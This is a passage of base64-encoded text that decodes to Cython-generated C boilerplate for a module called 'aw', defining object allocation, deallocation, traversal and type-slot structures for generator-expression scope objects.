VlbGlzdF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl07CiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKTsKICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpOwogICAgUHlPYmplY3RfR0NfVHJhY2sobyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApOwogICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7CiAgfQogICNlbmRpZgogIHJldHVybiBvOwp9CgpzdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5T2JqZWN0ICpvKSB7CiAgc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbzsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7CiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSB7CiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjsKICAgIH0KICB9CiAgI2VuZGlmCiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTsKICBQeV9DTEVBUihwLT5fX3B5eF9vdXRlcl9zY29wZSk7CiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgUHlfQ0xFQVIocC0+X19weXhfdl9fKTsKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA8IDgpICYgKGludCkoUHlfVFlQRShvKS0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkpKSB7CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pOwogICAgI2Vsc2UKICAgIHsKICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTsKICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7CiAgICB9CiAgICAjZW5kaWYKICB9Cn0KCnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7CiAgaW50IGU7CiAgc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbzsKICB7CiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpOwogICAgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfb3V0ZXJfc2NvcGUpIHsKICAgIGUgPSAoKnYpKCgoUHlPYmplY3QgKilwLT5fX3B5eF9vdXRlcl9zY29wZSksIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF9nZW5leHByX2FyZ18wLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfdl9fKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF92X18sIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIHJldHVybiAwOwp9CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc2xvdHNbXSA9IHsKICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByfSwKICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJ9LAogIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByfSwKICB7MCwgMH0sCn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMgPSB7CiAgImF3Ll9fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIiLAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSwKICAwLAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwKICBfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3Nsb3RzLAp9OwojZWxzZQoKc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0gewogIFB5VmFyT2JqZWN0X0hFQURfSU5JVCgwLCAwKQogICJhdy4iIl9fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIiLCAKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciksIAogIDAsIAogIF9fcHl4X3RwX2RlYWxsb2NfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIAogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgCiAgMCwgCiAgX19weXhfdHBfdHJhdmVyc2VfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCiAgMCwgCiAgI2VuZGlmCiAgMCwgCiAgMCwgCiAgX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIDAsIAogICNlbHNlCiAgTlVMTCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjEgJiYgKCFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgUFlQWV9WRVJTSU9OX05VTSA+PSAweDA3MDMwODAwKQogIDAsIAogICNlbmRpZgogICNpZiBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgPT0gMQogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAwLCAKICAjZW5kaWYKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGEwMDAwCiAgMCwgCiAgI2VuZGlmCn07CiNlbmRpZgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICphLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICprKSB7CiAgUHlPYmplY3QgKm87CiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICBhbGxvY2Z1bmMgYWxsb2NfZnVuYyA9IChhbGxvY2Z1bmMpUHlUeXBlX0dldFNsb3QodCwgUHlfdHBfYWxsb2MpOwogIG8gPSBhbGxvY19mdW5jKHQsIDApOwogICNlbHNlCiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpKSkgewogICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbLS1fX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJdOwogICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSk7CiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTsKICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgIG8gPSAoKnQtPnRwX2FsbG9jKSh0LCAwKTsKICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwOwogIH0KICAjZW5kaWYKICByZXR1cm4gbzsKfQoKc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcihQeU9iamVjdCAqbykgewogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87CiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICBpZiAodW5saWtlbHkoKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAgfHwgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShvKSwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFKSkgJiYgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkgewogICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikgewogICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47CiAgICB9CiAgfQogICNlbmRpZgogIFB5T2JqZWN0X0dDX1VuVHJhY2sobyk7CiAgUHlfQ0xFQVIocC0+X19weXhfb3V0ZXJfc2NvcGUpOwogIFB5X0NMRUFSKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIFB5X0NMRUFSKHAtPl9fcHl4X3ZfXyk7CiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcikpKSkgewogICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKytdID0gKChzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UUwogICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTsKICAgICNlbHNlCiAgICB7CiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7CiAgICAgIGlmICh0cF9mcmVlKSB0cF9mcmVlKG8pOwogICAgfQogICAgI2VuZGlmCiAgfQp9CgpzdGF0aWMgaW50IF9fcHl4X3RwX3RyYXZlcnNlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkgewogIGludCBlOwogIHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKnAgPSAoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqKW87CiAgewogICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTsKICAgIGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X291dGVyX3Njb3BlKSB7CiAgICBlID0gKCp2KSgoKFB5T2JqZWN0ICopcC0+X19weXhfb3V0ZXJfc2NvcGUpLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfZ2VuZXhwcl9hcmdfMCkgewogICAgZSA9ICgqdikocC0+X19weXhfZ2VuZXhwcl9hcmdfMCwgYSk7IGlmIChlKSByZXR1cm4gZTsKICB9CiAgaWYgKHAtPl9fcHl4X3ZfXykgewogICAgZSA9ICgqdikocC0+X19weXhfdl9fLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICByZXR1cm4gMDsKfQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByX3Nsb3RzW10gPSB7CiAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19weXhfdHBfZGVhbGxvY18yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sCiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSwKICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcn0sCiAgezAsIDB9LAp9OwpzdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zcGVjID0gewogICJhdy5fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIiwKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciksCiAgMCwKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsCiAgX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zbG90cywKfTsKI2Vsc2UKCnN0YXRpYyBQeVR5cGVPYmplY3QgX19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciA9IHsKICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMCkKICAiYXcuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIiwgCiAgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpLCAKICAwLCAKICBfX3B5eF90cF9kZWFsbG9jXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCAKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIAogIDAsIAogIF9fcHl4X3RwX3RyYXZlcnNlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIF9fcHl4X3RwX25ld18yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgMCwgCiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICAwLCAKICAjZWxzZQogIE5VTEwsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMCkKICAwLCAKICAjZW5kaWYKICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDEKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMAogIDAsIAogICNlbmRpZgogICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMAogIDAsIAogICNlbmRpZgp9OwojZW5kaWYKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykgewogIFB5T2JqZWN0ICpvOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTsKICBvID0gYWxsb2NfZnVuYyh0LCAwKTsKICAjZWxzZQogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHsKICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByXTsKICAgIG1lbXNldChvLCAwLCBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpOwogICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7CiAgICBQeU9iamVjdF9HQ19UcmFjayhvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICBvID0gKCp0LT50cF9hbGxvYykodCwgMCk7CiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDsKICB9CiAgI2VuZGlmCiAgcmV0dXJuIG87Cn0KCnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIoUHlPYmplY3QgKm8pIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilvOwogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgaWYgKHVubGlrZWx5KChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwIHx8IF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUobyksIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSkpICYmIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHsKICAgIGlmIChfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2RlYWxsb2MsIGRlc3RydWN0b3IpID09IF9fcHl4X3RwX2RlYWxsb2NfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpIHsKICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuOwogICAgfQogIH0KICAjZW5kaWYKICBQeU9iamVjdF9HQ19VblRyYWNrKG8pOwogIFB5X0NMRUFSKHAtPl9fcHl4X291dGVyX3Njb3BlKTsKICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICBQeV9DTEVBUihwLT5fX3B5eF92X18pOwogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKSkpIHsKICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKW8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgICNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7CiAgICAjZWxzZQogICAgewogICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpOwogICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTsKICAgIH0KICAgICNlbmRpZgogIH0KfQoKc3RhdGljIGludCBfX3B5eF90cF90cmF2ZXJzZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeU9iamVjdCAqbywgdmlzaXRwcm9jIHYsIHZvaWQgKmEpIHsKICBpbnQgZTsKICBzdHJ1Y3QgX19weXhfb2JqXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgKilvOwogIHsKICAgIGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgMSwgdiwgYSk7CiAgICBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF9vdXRlcl9zY29wZSkgewogICAgZSA9ICgqdikoKChQeU9iamVjdCAqKXAtPl9fcHl4X291dGVyX3Njb3BlKSwgYSk7IGlmIChlKSB